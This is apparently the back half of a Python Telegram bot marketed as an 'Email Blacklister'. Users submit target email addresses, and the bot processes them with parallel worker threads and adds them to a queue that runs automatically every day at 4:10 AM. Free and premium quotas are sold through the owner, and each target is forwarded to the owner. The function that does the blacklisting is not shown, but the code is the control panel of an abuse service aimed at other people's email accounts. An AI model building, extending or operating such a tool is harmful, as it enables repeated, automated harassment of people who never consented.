            emails = [e.strip() for e in message_text.split(',')]
            valid_emails = []
            invalid_emails = []
            for email in emails:
                if '@' in email and '.' in email:
                    if email not in auto_emails_list:
                        auto_emails_list.append(email)
                        valid_emails.append(email)
                    else:
                        invalid_emails.append(f"{email} (already exists)")
                else:
                    invalid_emails.append(f"{email} (invalid format)")
            save_auto_emails()
            response = f"""✅ Global Queue Update

━━━━━━━━━━━━━━━━━━━━━━━━
Addition Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Added: {len(valid_emails)}
▸ Failed: {len(invalid_emails)}
▸ Total: {len(auto_emails_list)}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Schedule: Daily at 4:10 AM"""
            if valid_emails:
                response += "\n\n✅ Added:\n" + "\n".join([f"▸ {e}" for e in valid_emails])
            if invalid_emails:
                response += "\n\n❌ Failed:\n" + "\n".join([f"▸ {e}" for e in invalid_emails])
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=get_admin_inline_keyboard())
            return

        if is_admin(user_id) and user_states.get(user_id) == "awaiting_premium_user":
            try:
                target_id = int(message_text)
                target = find_user_by_id(target_id)
                if target is None:
                    await update.message.reply_text("❌ User not found in database. They must start the bot first.", reply_markup=get_admin_inline_keyboard())
                    user_states[user_id] = "idle"
                    return
                if is_admin(target_id):
                    await update.message.reply_text("ℹ️ This user is already an administrator.", reply_markup=get_admin_inline_keyboard())
                    user_states[user_id] = "idle"
                    return
                if is_premium(target_id):
                    await update.message.reply_text("ℹ️ This user already has premium access.", reply_markup=get_admin_inline_keyboard())
                    user_states[user_id] = "idle"
                    return
                if give_premium(target_id):
                    try:
                        await context.bot.send_message(
                            chat_id=target_id,
                            text=f"""💎 Premium Access Granted

━━━━━━━━━━━━━━━━━━━━━━━━
Congratulations!

Your account has been upgraded to 
premium status by an administrator.

━━━━━━━━━━━━━━━━━━━━━━━━
Premium Benefits
━━━━━━━━━━━━━━━━━━━━━━━━
▸ {PREMIUM_MANUAL_LIMIT} manual blacklist quota
▸ {PREMIUM_AUTO_LIMIT} automated queue slots
▸ Priority processing
▸ Premium profile badge
▸ Exclusive premium features

━━━━━━━━━━━━━━━━━━━━━━━━
Thank you for being a valued member.

👑 {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
                        )
                    except Exception as e:
                        print(f"{R}[!] Failed to notify user: {e}{S}")
                    await update.message.reply_text(f"✅ Premium access granted to user {target_id}.", reply_markup=get_admin_inline_keyboard())
                else:
                    await update.message.reply_text("❌ Failed to grant premium access.", reply_markup=get_admin_inline_keyboard())
            except ValueError:
                await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.", reply_markup=get_admin_inline_keyboard())
            user_states[user_id] = "idle"
            return

        if is_admin(user_id) and user_states.get(user_id) == "awaiting_remove_premium_user":
            try:
                target_id = int(message_text)
                if not is_premium(target_id):
                    await update.message.reply_text("ℹ️ This user does not have premium access.", reply_markup=get_admin_inline_keyboard())
                    user_states[user_id] = "idle"
                    return
                if remove_premium(target_id):
                    try:
                        await context.bot.send_message(
                            chat_id=target_id,
                            text=f"""⚠️ Premium Access Expired

━━━━━━━━━━━━━━━━━━━━━━━━
Your premium access has been revoked.

━━━━━━━━━━━━━━━━━━━━━━━━
Current Limits
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Manual Blacklist: {FREE_MANUAL_LIMIT}
▸ Automated Slots: {FREE_AUTO_LIMIT}

To renew, contact: {OWNER_USERNAME}"""
                        )
                    except Exception as e:
                        print(f"{R}[!] Failed to notify user: {e}{S}")
                    await update.message.reply_text(f"✅ Premium access revoked from user {target_id}.", reply_markup=get_admin_inline_keyboard())
                else:
                    await update.message.reply_text("❌ Failed to revoke premium access.", reply_markup=get_admin_inline_keyboard())
            except ValueError:
                await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.", reply_markup=get_admin_inline_keyboard())
            user_states[user_id] = "idle"
            return

        if user_states.get(user_id) == "awaiting_user_auto_email":
            emails = [e.strip() for e in message_text.split(',')]
            valid = []
            invalid = []
            for email in emails:
                if '@' in email and '.' in email:
                    success, reason = add_user_auto_email(user_id, email)
                    if success:
                        valid.append(email)
                    else:
                        if reason == "already_exists":
                            invalid.append(f"{email} (already in queue)")
                        elif reason == "limit_reached":
                            invalid.append(f"{email} (queue full)")
                        else:
                            invalid.append(f"{email} (error)")
                else:
                    invalid.append(f"{email} (invalid format)")
            auto_emails = get_user_auto_emails(user_id)
            auto_limit = get_auto_limit(user_id)
            response = f"""✅ Queue Update Complete

━━━━━━━━━━━━━━━━━━━━━━━━
Addition Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Added: {len(valid)}
▸ Failed: {len(invalid)}
▸ Total: {len(auto_emails)} / {format_limit(auto_limit)}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Schedule: Daily at 4:10 AM"""
            if valid:
                response += "\n\n✅ Added:\n" + "\n".join([f"▸ {e}" for e in valid])
            if invalid:
                response += "\n\n❌ Failed:\n" + "\n".join([f"▸ {e}" for e in invalid])
            user_states[user_id] = "idle"
            await update.message.reply_text(response)
            return

        if user_states.get(user_id) == "awaiting_user_remove_email":
            emails = [e.strip() for e in message_text.split(',')]
            removed = []
            not_found = []
            for email in emails:
                if remove_user_auto_email(user_id, email):
                    removed.append(email)
                else:
                    not_found.append(email)
            auto_emails = get_user_auto_emails(user_id)
            auto_limit = get_auto_limit(user_id)
            response = f"""❌ Queue Update Complete

━━━━━━━━━━━━━━━━━━━━━━━━
Removal Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Removed: {len(removed)}
▸ Not Found: {len(not_found)}
▸ Remaining: {len(auto_emails)} / {format_limit(auto_limit)}
━━━━━━━━━━━━━━━━━━━━━━━━"""
            if removed:
                response += "\n\n✅ Removed:\n" + "\n".join([f"▸ {e}" for e in removed])
            if not_found:
                response += "\n\n❌ Not Found:\n" + "\n".join([f"▸ {e}" for e in not_found])
            user_states[user_id] = "idle"
            await update.message.reply_text(response)
            return

        if user_states.get(user_id) == "awaiting_email":
            if '@' in message_text and '.' in message_text:
                manual_limit = get_manual_limit(user_id)
                count = get_user_blacklist_count(user_id)
                if count >= manual_limit and manual_limit != float('inf'):
                    user_states[user_id] = "idle"
                    await update.message.reply_text(
                        f"""❌ Manual Quota Reached

━━━━━━━━━━━━━━━━━━━━━━━━
You have consumed your complete manual 
blacklist quota.

▸ Used: {count} / {format_limit(manual_limit)}

💎 Premium upgrades to {PREMIUM_MANUAL_LIMIT} 
manual operations.

👑 Contact: {OWNER_USERNAME}""",
                        reply_markup=get_user_keyboard(user_id)
                    )
                    return
                await notify_owner_email(context, user, message_text)
                processing_msg = await update.message.reply_text(
                    f"""⏳ Processing Request

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Target: {message_text}
▸ Operator: {user.full_name if user.full_name else 'User'}
▸ Engine: {NUM_WORKERS} parallel threads
━━━━━━━━━━━━━━━━━━━━━━━━

Please await the execution report."""
                )
                try:
                    result = blacklist_email(message_text)
                    if result == "success" and not is_admin(user_id):
                        increment_blacklist_count(user_id)
                    body = format_result(result, message_text, user, user_id)
                    if is_admin(user_id):
                        keyboard = [[InlineKeyboardButton("🔄 Try Again", callback_data='blacklist')]]
                        for row in get_admin_inline_keyboard().inline_keyboard:
                            keyboard.append(row)
                        await processing_msg.edit_text(body, reply_markup=InlineKeyboardMarkup(keyboard))
                    else:
                        await processing_msg.edit_text(body, reply_markup=get_user_keyboard(user_id))
                    user_states[user_id] = "idle"
                except Exception as e:
                    print(f"{R}[!] Blacklist error: {e}{S}")
                    await processing_msg.edit_text(
                        f"""⚠️ System Error

━━━━━━━━━━━━━━━━━━━━━━━━
An unexpected system error occurred 
during processing.

Please contact support if the issue 
persists:

👑 {OWNER_USERNAME}
⏰ Available: 24/7""",
                        reply_markup=get_user_keyboard(user_id)
                    )
                    user_states[user_id] = "idle"
            else:
                if is_admin(user_id):
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data='blacklist')],
                        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
                    ]
                    await update.message.reply_text(
                        """❌ Invalid Email Format

━━━━━━━━━━━━━━━━━━━━━━━━
The submitted address does not match 
our required format.

Required:
▸ Must contain @ symbol
▸ Must contain . extension
▸ No whitespace allowed

Example: user@example.com""",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                else:
                    await update.message.reply_text(
                        """❌ Invalid Email Format

━━━━━━━━━━━━━━━━━━━━━━━━
The submitted address does not match 
our required format.

Required:
▸ Must contain @ symbol
▸ Must contain . extension
▸ No whitespace allowed

Example: user@example.com

▸ Try again or click any button to cancel."""
                    )
            return

        if is_admin(user_id):
            await update.message.reply_text(
                f"👑 Administrative Panel\n\nGreetings, {user.full_name if user.full_name else 'Administrator'}.\n\nAdministrative tools are available below.\nThe user keyboard remains accessible for standard operations.",
                reply_markup=get_admin_inline_keyboard()
            )
        else:
            await update.message.reply_text(
                f"✦ Email Blacklister ✦\n\nGreetings, {user.full_name if user.full_name else 'Member'}.\n\nPlease select an operation from the menu below.",
                reply_markup=get_user_keyboard(user_id)
            )

    except Exception as e:
        print(f"{R}[!] Error in handle_message: {e}{S}")

async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    try:
        chat_member = await context.bot.get_chat_member(
            chat_id=FORCE_CHANNEL_USERNAME,
            user_id=user_id
        )
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"{R}[!] Channel check error: {e}{S}")
        return False

async def send_force_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Have Joined", callback_data='check_join')]
    ]
    await update.message.reply_text(
        """🔒 Channel Membership Required

━━━━━━━━━━━━━━━━━━━━━━━━
Access to this platform requires 
membership in our official channel.

▸ Channel: @SPIDEYFREEFILES

Please join to continue.""",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def send_force_channel_message_update(query):
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Have Joined", callback_data='check_join')]
    ]
    await query.edit_message_text(
        """🔒 Channel Membership Required

━━━━━━━━━━━━━━━━━━━━━━━━
Access to this platform requires 
membership in our official channel.

▸ Channel: @SPIDEYFREEFILES

Please join to continue.""",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        if is_new_user(user.id):
            try:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"""🌟 New Member Registration

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Name: {user.full_name if user.full_name else 'Unknown'}
▸ Username: @{user.username if user.username else 'N/A'}
▸ ID: {user.id}
▸ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify owner: {e}{S}")

async def notify_owner_email(context: ContextTypes.DEFAULT_TYPE, user, email):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"""📧 Email Submission

━━━━━━━━━━━━━━━━━━━━━━━━
▸ User: {user.full_name if user.full_name else 'Unknown'}
▸ Username: @{user.username if user.username else 'N/A'}
▸ Email: {email}
▸ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━"""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    user_id = user.id
    user_states[user_id] = "idle"
    if is_admin(user_id):
        await update.message.reply_text("✅ Operation Cancelled\n\nAdministrative panel remains available.", reply_markup=get_admin_inline_keyboard())
    else:
        await update.message.reply_text("✅ Operation Cancelled\n\nUse the keyboard below to continue.", reply_markup=get_user_keyboard(user_id))

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(build_status_text())

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    await update.message.reply_text(build_profile_text(user, user.id), parse_mode='HTML')

def schedule_auto_blacklist(application):
    import asyncio

    def check_and_run():
        last_run = None
        while True:
            try:
                now = datetime.now()
                if now.hour == 4 and now.minute == 10:
                    if last_run != now.date():
                        print(f"{G}[+] Running auto blacklist...{S}")
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        try:
                            loop.run_until_complete(auto_blacklist_job(application))
                        except Exception as e:
                            print(f"{R}[!] Auto blacklist error: {e}{S}")
                        finally:
                            loop.close()
                        last_run = now.date()
                        print(f"{G}[+] Auto blacklist completed{S}")
                time.sleep(30)
            except Exception as e:
                print(f"{R}[!] Scheduler error: {e}{S}")
                time.sleep(60)

    thread = threading.Thread(target=check_and_run, daemon=True)
    thread.start()
    print(f"{G}[+] Auto blacklist scheduled for 4:10 AM daily{S}")

def main():
    try:
        print(f"{G}[+] Loading data...{S}")
        load_auto_emails()
        load_users()
        load_admins()
        load_banned_users()

        print(f"{G}[+] Building application...{S}")
        request = HTTPXRequest(
            connection_pool_size=8,
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )
        application = Application.builder().token(BOT_TOKEN).request(request).build()

        print(f"{G}[+] Adding handlers...{S}")
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("cancel", cancel_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("profile", profile_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("bannedlist", banned_list_command))
        application.add_handler(CommandHandler("premium", premium_command))
        application.add_handler(CommandHandler("removepremium", removepremium_command))
        application.add_handler(CommandHandler("premiumlist", premium_list_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        schedule_auto_blacklist(application)

        print(f"{G}[+] Bot is ready!{S}")
        print(f"""
{G}╔═══════════════════════════════════════╗{S}
{G}║     ✨🌟 BOT STARTED 🌟✨           ║{S}
{G}╠═══════════════════════════════════════╣{S}
{G}║  🤖 Status: {G}🟢 ONLINE{S}
{G}║  👑 Owner: {C}{OWNER_USERNAME}{S}
{G}║  🆔 Owner ID: {C}{OWNER_ID}{S}
{G}║  ⚡ Workers: {C}{NUM_WORKERS}{S} Active
{G}║  🔒 Security: {G}✅ Secure{S}
{G}║  ⏰ Auto Blacklist: 4:10 AM
{G}║  📧 Global Auto: {C}{len(auto_emails_list)}{S} emails
{G}║  👥 Users: {C}{len(users_list)}{S} registered
{G}║  💎 Premium: {C}enabled{S}
{G}║  📊 Limits: {C}{FREE_MANUAL_LIMIT}/{PREMIUM_MANUAL_LIMIT}{S}
{G}║  🚫 Banned Users: {C}{len(banned_users_list)}{S}
{G}║  ✅ Bot is running successfully!
{G}║  Press Ctrl+C to stop
{G}╚═══════════════════════════════════════╝{S}
""")

        try:
            application.run_polling()
        except Conflict as e:
            print(f"{R}[!] Conflict Error: {e}{S}")
            print(f"{Y}[!] Another bot instance is running. Run: pkill -f 'python' and try again{S}")
        except Exception as e:
            print(f"{R}[!] Error: {e}{S}")

    except Exception as e:
        print(f"{R}[!] Main error: {e}{S}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"""
{R}╔═══════════════════════════════════════╗{S}
{R}║     ⚠️🛑 BOT STOPPED 🛑⚠️           ║{S}
{R}╠═══════════════════════════════════════╣{S}
{R}║  Bot has been stopped by user.       ║{S}
{R}║  Thank you for using the bot!        ║{S}
{R}╚═══════════════════════════════════════╝{S}
""")
        sys.exit()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{S}")
        import traceback
        traceback.print_exc()